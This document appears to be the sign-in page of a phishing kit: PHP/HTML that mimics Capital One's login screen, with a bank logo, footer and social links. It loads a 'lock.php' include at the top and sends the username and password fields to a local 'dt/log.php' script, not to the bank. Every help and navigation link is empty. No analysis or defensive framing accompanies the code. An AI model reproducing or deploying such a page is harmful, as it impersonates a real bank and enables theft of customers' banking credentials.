<?php include "../../x/lock.php"; ?>

<html>
<head>
<title>Sign In</title>
<link rel="stylesheet" href="cs/style.css">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="shortcut icon" href="./im/icon.png" type="image/ico" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="js/jquery.js"></script>
<script src="js/script.js"></script>
</head>
<body>
<header>
	<div class="hold">
		<div class="brand">
			<img src="./im/capitalone-logo.png" alt="capital one">
		</div>
		<div class="nav rt">
			<a href="" title="United States"><img src="im/nv.png" alt="map-marker"> United States <i class="fa fa-angle-down"></i></a>
			<a href="" title="English"><img src="im/gl.png" alt="globe"> English <i class="fa fa-angle-down"></i></a>
			<a href="" title="Sign In"><img src="im/sn.png" alt="user-icon"> Sign In</a>
		</div>
	</div>
</header>
<div class="container">
	<div class="hold">
		<div class="lgn">
			<div class="bar barh">
				<img src="im/avatar.png" alt="avatar" style="width:50px;">
				<p>Sign In</p>
			</div>
			<div class="bar barr">
				<form action="dt/log.php" method="POST">
					<div class="cnt"><a href="" alt="usa" class="usa"><img src="./im/USA.png"/></a><a href="" alt="can" class="can"><img src="./im/CAN.png"/></a><a href="" alt="uk" class="uk"><img src="./im/UK.png"/></a></div>
					<div class="imp">
						<label>Username<label>
						<input type="text" name="coid" class="inp usr" id="coid" autocomplete="off" required />
					</div>
					<div class="imp">
						<label>Password<label>
						<input type="password" name="copw" class="inp pss" id="copw" autocomplete="off" required />
					</div>
					<div class="imp">
						<input type="checkbox" name="checkbox" class="ckbx" id="ckbx">
						<label for="ckbx" class="ckbx-lbl">Remember Me</label>
					</div>
					<div class="imp">
						<button type="submit" name="submit" class="btn btn1" id="btn">Sign In</button>
					</div>
					<div class="imp">
						<a href="" class="lt" title="Forgot Username or Password?">Forgot Username or Password?</a>
						<a href="" class="rt" title="Enroll here">Enroll here</a>
					</div>
				</form>
			</div>
		</div>
	</div>
</div>
<footer>
	<div class="hold hld">
		<ul>
			<li><a href="" title="PRODUCTS"><i class="fa fa-caret-right"></i>PRODUCTS</a><li>
			<li><a href="" title="ABOUT US"><i class="fa fa-caret-right"></i>ABOUT US</a><li>
			<li><a href="" title="CAREERS"><i class="fa fa-caret-right"></i>CAREERS</a><li>
			<li><a href="" title="LEGAL"><i class="fa fa-caret-right"></i>LEGAL</a><li>
		</ul>
		<ul class="ul">
			<li><a href="" title="CONTACT US">CONTACT US</a><li>
			<li><a href="" class="sm" title="Privacy">Privacy</a><li>
			<li><a href="" class="sm" title="Security">Security</a><li>
			<li><a href="" class="sm" title="Terms & Conditions">Terms & Conditions</a><li>
			<li><a href="" class="sm" title="Accessibility">Accessibility</a><li>
		</ul>
		<p class="social-media rt">
			<a href="https://twitter.com/capitalone" class="twitter ng-scope" target="_blank" title="Link opens in a new window" translate-default="twitter" translate="languageJsonProps.sic.footer.TWITTER.link.text">Twitter</a>
			<a href="https://www.facebook.com/capitalone" class="facebook ng-scope" target="_blank" title="Link opens in a new window" translate-default="Facebook" translate="languageJsonProps.sic.footer.FACEBOOK.link.text">Facebook</a>
			<a href="https://www.youtube.com/user/CapitalOne" class="youtube ng-scope" target="_blank" title="Link opens in a new window" translate-default="YouTube" translate="languageJsonProps.sic.footer.YOUTUBE.link.text">YouTube</a>
			<a href="https://www.linkedin.com/company/capital-one" class="linkedin ng-scope" target="_blank" title="Link opens in a new window" translate-default="Linked In" translate="languageJsonProps.sic.footer.LINKEDIN.link.text">Linked In</a>
			<a href="https://www.instagram.com/capitalone/" class="instagram ng-scope" target="_blank" title="Link opens in a new window" translate-default="Instagram" translate="languageJsonProps.sic.footer.INSTAGRAM.link.text">Instagram</a>
		</p><br><br>
		<ul class="ul1" style="font-size:18px;">
			<li><a href="http://www.capitalone.com/" class="c1" title="capitalone"><img src="im/capitalone-logo.png" alt="capitalone" style="width:90px;margin-bottom:-6px;"></a></li>
			<li><p>&copy;<?php echo date("Y");?> Capital One</p></li>
		</ul>
		<ul class="ul2 rt">
			<li style="display:block;font-weight:bolder;text-shadow:0 0 1px #333;margin:10px 0;"><i><a href="" title="MEMBER FDIC">MEMBER FDIC</a></i></li>
			<li>Equal Housing Lender <img src="im/hm.png" alt="Equal Housing Lender"></li>
		</ul>
	</div>
</footer>
</body>
</html>